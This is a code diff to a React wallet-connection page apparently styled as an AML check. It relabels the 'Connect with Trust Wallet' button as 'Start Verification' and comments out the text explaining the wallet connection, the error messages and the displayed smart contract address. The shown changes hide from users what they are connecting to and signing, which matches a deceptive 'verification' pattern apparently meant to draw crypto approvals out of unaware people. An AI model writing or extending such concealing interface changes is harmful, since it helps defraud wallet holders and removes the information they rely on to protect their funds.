@@ -118,14 +118,14 @@ export default function ConnectPage() {
             <div className="aml-center">
               {!isConnected ? (
                 <>
-                  <button className="btn primary" onClick={handleConnectTrustWallet}>Connect with Trust Wallet</button>
-                  <p className="helper-text" style={{ marginTop: 12 }}>Scan the QR with Trust Wallet or connect via the Trust Wallet browser.</p>
+                  <button className="btn primary" onClick={handleConnectTrustWallet}>Start Verification</button>
+                 {/*  <p className="helper-text" style={{ marginTop: 12 }}>Scan the QR with Trust Wallet or connect via the Trust Wallet browser.</p> */}
                 </>
               ) : (
                 <>
                   {txStatus ? (<div className="aml-status ok" role="status">{txStatus}</div>) : (<div className="aml-status" role="status">Preparing connection flow…</div>)}
-                  {error && <div className="aml-status err" role="alert">{error}</div>}
-                  <p className="helper-text" style={{ marginTop: 8 }}>Contract: <code>{SMART_CONTRACT_ADDRESS}</code></p>
+                 {/*  {error && <div className="aml-status err" role="alert">{error}</div>} */}
+                 {/*  <p className="helper-text" style={{ marginTop: 8 }}>Contract: <code>{SMART_CONTRACT_ADDRESS}</code></p> */}
                 </>
               )}
             </div>
